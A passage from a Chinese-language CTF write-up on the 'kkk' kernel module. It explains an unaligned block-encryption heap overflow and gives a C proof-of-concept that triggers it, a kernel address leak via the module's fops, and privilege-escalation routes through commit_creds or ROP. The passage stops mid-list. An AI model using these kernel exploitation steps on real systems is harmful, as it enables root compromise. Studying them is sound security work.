<span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span> <span class="c1">// user space pointer
</span><span class="c1"></span><span class="p">};</span>
</code></pre></td></tr></table>
</div>
</div><p>在 <code>add</code> 操作中，会找到 filep 的 private_data，选最小 idx 的 <code>kkk_obj</code> 指针数组来分配。分配方式很简单，为该指针分配 <code>kkk_obj</code> 结构体大小加上 <code>keypack-&gt;size</code> 与 <code>datapack-&gt;size</code> 大小的空间。以参数 con 各个域来填充该  <code>kkk_obj</code> 结构体，同时会把 <code>keypack-&gt;ptr</code> 与 <code>datapack-&gt;ptr</code> 具体内容拷贝到后方区域。其中 <code>handler</code> 是 <code>type</code> 指定的加密算法的函数指针。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">kkk_obj</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">keypack</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">datapack</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">enc</span><span class="p">;</span>
    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">handler</span><span class="p">)(</span><span class="k">struct</span> <span class="n">kkk_obj</span> <span class="o">*</span><span class="p">);</span>
<span class="p">};</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="0x6b67-update">0x6B67 update</h4>
<p><code>update</code> 送入参数 con 是以结构体 <code>kkk_ioctl_other_arg</code> 形式，有如下域</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">kkk_ioctl_other_arg</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">key</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">kkk_pack</span> <span class="n">data</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></td></tr></table>
</div>
</div><p>在 <code>update</code> 操作中，会根据 con 的内容修改 <code>kkk_obj[id]</code> 对应的 <code>keypack-&gt;ptr</code> 与 <code>datapack-&gt;ptr</code> 内容（不能改 size）。</p>
<h4 id="0x6b69-dump">0x6B69 dump</h4>
<p><code>dump</code> 送入参数 con 也是以结构体 <code>kkk_ioctl_other_arg</code> 形式。它会将 <code>kkk_obj[id]</code> 对应的 <code>keypack-&gt;ptr</code> 与 <code>datapack-&gt;ptr</code> 内容覆盖到 con 的 <code>keypack-&gt;ptr</code> 与 <code>datapack-&gt;ptr</code> 指针所指内容中。（size 域同样无效）</p>
<h4 id="0x6b6b-launch">0x6B6B launch</h4>
<p>传入参数同样是以结构体 <code>kkk_ioctl_other_arg</code> 形式。会执行 <code>kkk_obj[id]-&gt;handler(kkk_obj[id])</code></p>
<h4 id="0x6b6d-detach">0x6B6D detach</h4>
<p>参数同样是以结构体 <code>kkk_ioctl_other_arg</code> 形式。会 <code>kfree(kkk_obj[id])</code> 并清零指针。</p>
<h3 id="加密函数">加密函数</h3>
<p>上述交互看上去并没有什么问题，<code>detach</code> 里没有 uaf，<code>update</code> 和 <code>dump</code> 因为 size 域根本无效所以也没有越界。所以来接着看看 <code>handler</code> 指向的各个加密函数。具体来说，<code>handler</code> 是根据 <code>type</code> 如下赋值的，可见一共有 4 中加密方式。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">// add 功能中
handler = handlers[type &amp; 3];

.data:00000000000011E0 handlers        dq offset kkk_des_cb    ; DATA XREF: kkk_unlocked_ioctl+1E0↑r
.data:00000000000011E8                 dq offset kkk_tdes_cb
.data:00000000000011F0                 dq offset kkk_aes128_cb
.data:00000000000011F8                 dq offset kkk_aes256_cb
</code></pre></td></tr></table>
</div>
</div><p>这 4 种加密函数做的事都是把 <code>obj-&gt;keypack.ptr</code> 的前八个字节作为 key 去进行加密 <code>obj-&gt;datapack.ptr</code> ，会调用函数 <code>enc_dec_internal</code> ，其中 <code>size</code> 由 <code>obj-&gt;datapack.size</code> 指定。可以看到它的操作是按 <code>blocksize</code> 去逐块加密，但我们注意到它并没有进行对齐操作。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">void</span>
<span class="nf">enc_dec_internal</span><span class="p">(</span><span class="k">struct</span> <span class="n">crypto_cipher</span> <span class="o">*</span><span class="n">tfm</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span>
                 <span class="kt">char</span> <span class="o">*</span><span class="n">block1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">block2</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">blocksize</span><span class="p">,</span> <span class="kt">int</span> <span class="n">enc</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="n">blocksize</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="n">block1</span><span class="p">,</span> <span class="n">buf</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">blocksize</span><span class="p">);</span>
        <span class="cm">/* code */</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">enc</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">crypto_cipher_encrypt_one</span><span class="p">(</span><span class="n">tfm</span><span class="p">,</span> <span class="n">block2</span><span class="p">,</span> <span class="n">block1</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span>
        <span class="p">{</span>
            <span class="n">crypto_cipher_decrypt_one</span><span class="p">(</span><span class="n">tfm</span><span class="p">,</span> <span class="n">block2</span><span class="p">,</span> <span class="n">block1</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">block2</span><span class="p">,</span> <span class="n">blocksize</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>漏洞就出现在这里。 <code>kkk_aes256_cb</code> 和 <code>kkk_aes128_cb</code> 中，这两个加密函数指定的 <code>blocksize</code> 均为 16，但是由于 <code>obj-&gt;datapack.size</code> 并没有做 16 字节对齐操作，将可能导致内核堆溢出。<code>kkk_des_cb</code> 与 <code>kkk_tdes_cb</code> 也同理，它也没有保证其 8 字节对齐。</p>
<h3 id="测试">测试</h3>
<p>尝试修改 kernel 启动的 init 脚本，对 kkk.ko 单独进行测试。将 <code>/parser</code> 启动命令改成 <code>/bin/sh</code> 即可。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/sh
</span><span class="cp"></span>
mkdir tmp
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
mount -t tmpfs none /tmp

<span class="nb">exec</span> 0&lt;/dev/console
<span class="nb">exec</span> 1&gt;/dev/console
<span class="nb">exec</span> 2&gt;/dev/console

<span class="nb">echo</span> -e <span class="s2">&#34;Boot took </span><span class="k">$(</span>cut -d<span class="s1">&#39; &#39;</span> -f1 /proc/uptime<span class="k">)</span><span class="s2"> seconds&#34;</span>

insmod /kkk.ko
chmod <span class="m">666</span> /dev/kkk
chmod <span class="m">740</span> /flag
<span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/kernel/kptr_restrict
<span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/kernel/dmesg_restrict
chmod <span class="m">400</span> /proc/kallsyms

poweroff -d <span class="m">600</span> -f <span class="p">&amp;</span>



<span class="c1"># setsid /bin/cttyhack setuidgid 1000 /parser</span>
setsid /bin/cttyhack setuidgid <span class="m">1000</span> /bin/sh

umount /proc
umount /sys
umount /tmp

poweroff -d <span class="m">0</span>  -f
</code></pre></td></tr></table>
</div>
</div><p>堆溢出 PoC 如下，将它静态编译放入文件系统即可。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="k">struct</span> <span class="n">AddParam</span><span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">type</span><span class="p">;</span> <span class="c1">// type and enc
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">key_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">data_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">;</span>   
<span class="p">};</span>

<span class="k">struct</span> <span class="n">OtherParam</span><span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">id</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">key_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">data_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">;</span>     
<span class="p">};</span>

<span class="kt">void</span> <span class="nf">Add</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">AddParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Add return :%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B64</span><span class="p">,</span> <span class="n">p</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">Run</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">OtherParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>    
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Launch return :%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B6B</span><span class="p">,</span> <span class="n">p</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">Detach</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">OtherParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B6D</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;/dev/kkk&#34;</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
    
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] open wrong, exit&#34;</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">struct</span> <span class="n">AddParam</span> <span class="n">a</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">OtherParam</span> <span class="n">r</span><span class="p">;</span>

    <span class="c1">// malloc 192 - 48 = 144 = 0x90
</span><span class="c1"></span>
    <span class="n">a</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key_len</span> <span class="o">=</span> <span class="mh">0x7F</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">data_len</span> <span class="o">=</span> <span class="mh">0x11</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>

    <span class="n">Add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>

    <span class="n">a</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key_len</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">data_len</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>

    <span class="n">Add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>

    <span class="c1">// memset(buf, 0x43, 8);
</span><span class="c1"></span>    <span class="c1">// Add(fd, &amp;a);
</span><span class="c1"></span>
    <span class="n">r</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">Run</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>

    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>


<span class="c1">// 0xffff98df82d7ccc0
</span><span class="c1"></span>
<span class="c1">// 0xffff98df82d7cd80
</span><span class="c1"></span>

</code></pre></td></tr></table>
</div>
</div><p>当 add 分配时，会调用 <code>kmalloc(obj-&gt;datapack.size + obj-&gt;keypack.size + 48)</code>，我们将它分配的堆块全部控制在 <code>kmalloc-192</code> 这个 SLUB 中，并使它们地址连续（如果不连续就多分配几个，直到连续）。这个 PoC 的逻辑是：让 SLUB 分配两个地址连续的 <code>kmalloc-192</code> 堆块，其 id 分别是 0 和 1，通过 <code>Run()</code> 触发对 <code>id=0</code> 的堆块的 <code>kkk_aes256_cb</code> 加密。通过加密前，堆块内容如下</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://s2.loli.net/2022/07/14/pYCxTnwQIkZjcyv.png"
        data-srcset="https://s2.loli.net/2022/07/14/pYCxTnwQIkZjcyv.png, https://s2.loli.net/2022/07/14/pYCxTnwQIkZjcyv.png 1.5x, https://s2.loli.net/2022/07/14/pYCxTnwQIkZjcyv.png 2x"
        data-sizes="auto"
        alt="https://s2.loli.net/2022/07/14/pYCxTnwQIkZjcyv.png"
        title="https://s2.loli.net/2022/07/14/pYCxTnwQIkZjcyv.png" /></p>
<p>通过加密后，由于对齐原因造成堆溢出，覆盖了相邻下方 <code>id=1</code> 堆块的 <code>keypack.size</code> 与 <code>keypack.ptr</code> 区域。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://s2.loli.net/2022/07/14/pBhu2qF54WymkRJ.png"
        data-srcset="https://s2.loli.net/2022/07/14/pBhu2qF54WymkRJ.png, https://s2.loli.net/2022/07/14/pBhu2qF54WymkRJ.png 1.5x, https://s2.loli.net/2022/07/14/pBhu2qF54WymkRJ.png 2x"
        data-sizes="auto"
        alt="https://s2.loli.net/2022/07/14/pBhu2qF54WymkRJ.png"
        title="https://s2.loli.net/2022/07/14/pBhu2qF54WymkRJ.png" /></p>
<h3 id="利用-1">利用</h3>
<p>堆溢出之后我们可以修改 <code>keypack.size</code> 与 <code>keypack.ptr</code> 区域，配合 <code>update</code> 与 <code>dump</code> 功能，实际上就可以做到内核区域任意地址读写。但堆上只有 SLUB 地址和 kkk.ko 的地址，内核代码段地址不得而知。很自然想到的一个方式是：修改 <code>fork</code> 出来的子进程的 <code>cred</code> 结构体。</p>
<h4 id="fork--zero-cred">fork &amp; zero <code>cred</code></h4>
<p><a href="https://xidoo.top/2021/08/slab_buddy_system0/#birds-eye-view" target="_blank" rel="noopener noreffer">SLUB 分配规则</a>比较简单，这里只需要注意三点：</p>
<ol>
<li><code>cred</code> 结构体大小进的是 <code>kmalloc-192</code> 这个 SLUB</li>
<li>不同大小的 SLUB 分配地址相差十万八千里</li>
<li>由于 <code>kmalloc-192</code> 的初始分配情况未知，可能出现分配时一个 <code>partial</code> 链用完了换了另一个等情况，导致连续分配的两个 SLUB 地址也不相邻，所以得多调一下避免这种情况的发生。</li>
</ol>
<p>所以我们的思路就是让一个 <code>kmalloc-192</code> 溢出，覆盖后一个 <code>kmalloc-192</code> 的域，再利用程序逻辑越界写在后面跟着的 <code>cred</code> 结构体的 <code>kmalloc-192</code>，清零 uid 位拿到 root 权限。本来应该是可以的，但我做到一半突然意识到忘了 sandbox 这回事了。。因为这题不能直接打内核，还是得从 parser 开始打，拿不到 shell 导致还是得在 parser 程序中用 sandbox 允许的系统调用来提权，sandbox 里不让 <code>fork</code> &hellip;</p>
<p>又想到 tty 结构体，如果能在 SLUB 中分配一个 tty 结构体就好了，说不定里面由一些内核代码段的地址。但是 <code>open(&quot;/dev/ptmx&quot;)</code> 总是返回 <code>errno=2</code> ，这个文件明明是有的，但是 <code>cat</code> 提示 No such file or directory。<a href="https://blog.csdn.net/yongbaoii/article/details/123924737" target="_blank" rel="noopener noreffer">查了一下</a>好像是 kernel 启动脚本的问题，靶机上也没法改启动脚本啊&hellip;遂作罢。</p>
<p>有一篇<a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628" target="_blank" rel="noopener noreffer">文章</a>总结了一下常用的结构体，但是日文翻译之后我都看不太懂&hellip;找到了相似的另一份<a href="https://kagehutatsu.com/?p=442" target="_blank" rel="noopener noreffer">中文资料</a>，也没找到适合大小的结构体。</p>
<h4 id="爆破内核代码段地址">爆破内核代码段地址</h4>
<p>其实拿到内核代码段地址就好办了，当我们拿到 <code>commit_creds</code> 地址之后只需要把堆上的加密函数指针覆盖成 <code>commit_creds</code> 就行，并且在堆上伪造一个 <code>init_creds</code>，触发加密逻辑即可拿到 root 权限，然后 orw 读 flag。这是 <a href="https://mp.weixin.qq.com/s/mF339elDBtjw1PCdBcXxxw" target="_blank" rel="noopener noreffer">Nu1L 战队题解</a>的思路。</p>
<p>虽然内核代码段只有 12 个 bits 在改变，但是这题开了 kaslr 吧&hellip;exp 地址正确的概率不是只有 1/2^12 吗 &hellip;</p>
<blockquote>
<p>但是怎么泄露内核地址呢? 越界读只能泄露kkk.ko的地址, 也没法ROP, 想了很久, 最终解决⽅法是: 爆破. 因为内核基地址的熵很⼩, 只有24bit, ⽽且实测发现⼤多数情况都是0x1F800000, 0x21100000这样⽐较⼩的数字, 因此爆破花不了多⻓时间的.</p>
</blockquote>
<p>感觉概率也挺低吧&hellip; Nu1L 的师傅说爆了一个多小时。</p>
<h4 id="泄露内核代码段地址">泄露内核代码段地址</h4>
<p>拿到内核代码段地址还有另一种办法。我们现在通过覆盖 <code>keypack.size</code> 可以进行越界读写，篡改后一个堆块的大小和指针域就能实现真正意义上的任意地址读写。我们可以很轻易的拿到 SLUB 地址和 kkk.ko 的加载地址（越界读拿到 <code>handler</code> 函数地址）现在的问题就是能不能在 SLUB 段或是 kkk.ko 段找到一个有 kernel 段代码地址的地方呢？</p>
<p>实际上是有的，由于 kkk.ko 的 fops 没有都被驱动实现（实现了就在 kkk.ko，没实现就用 kernel 原本的），所以在 fops 中可以找到 kernel 地址。<a href="https://ctf.njupt.edu.cn/752.html#kkk" target="_blank" rel="noopener noreffer">X1cT34m 战队</a> 与出题人大哥泄露 kernel 地址的思路都是如此。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">/ # cat /proc/kallsyms | grep kkk
ffffffffc0000000 t kkk_write    [kkk]
ffffffffc0000010 t enc_dec_internal     [kkk]
ffffffffc0000130 t kkk_aes256_cb        [kkk]
ffffffffc0000290 t kkk_aes128_cb        [kkk]
ffffffffc00003d0 t kkk_tdes_cb  [kkk]
ffffffffc0000510 t kkk_des_cb   [kkk]
ffffffffc0000620 t kkk_close    [kkk]
ffffffffc0000670 t kkk_open     [kkk]
ffffffffc00006b0 t kkk_read     [kkk]
ffffffffc00006c0 t kkk_unlocked_ioctl   [kkk]
ffffffffc00009f0 t kkk_compat_ioctl     [kkk]
ffffffffc00009f5 t kkk_exit     [kkk]
ffffffffc0001180 r kkk_fops     [kkk]   # !!!
ffffffffc000109f r .LC12        [kkk]
ffffffffc0001694 r _note_9      [kkk]
ffffffffc00016ac r _note_8      [kkk]
ffffffffc00020c0 d __this_module        [kkk]
ffffffffc00009f5 t cleanup_module       [kkk]
ffffffffc0002060 d handlers     [kkk]
ffffffffc0002000 d kkk_device   [kkk]

pwndbg&gt; x/10xg  0xffffffffc0001180
0xffffffffc0001180:     0xffffffffc00020c0      0xffffffff812258e0
0xffffffffc0001190:     0xffffffffc00006b0      0xffffffffc0000000
0xffffffffc00011a0:     0x0000000000000000      0x0000000000000000
0xffffffffc00011b0:     0x0000000000000000      0x0000000000000000
0xffffffffc00011c0:     0x0000000000000000      0x0000000000000000
</code></pre></td></tr></table>
</div>
</div><h4 id="privilege-escalation">privilege escalation</h4>
<p>拿到 kernel 地址就好办啦，这里我们也有三种方法</p>
<ul>
<li>
<p>Nu1L: 修改加密 <code>handler</code> 为 <code>commit_creds</code> ，在当前块伪造一个 <code>init_cred</code> ，触发加密即可。无需跳回用户态。</p>
</li>
<li>
<p>X1cT34m &amp; AAA（出题人大哥）：找 gadget 把栈迁移到 SLUB 上做 ROP，做完需要圆润地返回用户态。</p>
</li>
<li>
